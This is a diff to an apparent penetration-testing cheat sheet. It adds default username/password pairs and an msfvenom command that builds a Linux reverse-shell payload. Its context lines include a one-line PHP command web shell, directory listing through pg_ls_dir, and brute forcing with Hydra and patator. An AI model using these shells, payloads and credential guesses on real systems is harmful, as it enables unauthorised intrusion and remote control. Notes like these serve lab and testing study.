@@ -138,8 +138,10 @@ SELECT pg_ls_dir('/');
 ### Password Guessing  
 #### Default Credentials
 ```bash
-# CMS Web App 9000
+# anonymous:anonymous
+# guest:guest
 # admin:admin
+# admin:adminadmin
 ```
 
 #### Hydra
@@ -157,6 +159,11 @@ patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&pas
 # find a way to upload a PHP command shell
 vim cmd.php
 <?php echo shell_exec($_GET['cmd']); ?>
+```
+
+### Reverse Shell
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
 ```
 
 ## Maintaining Access
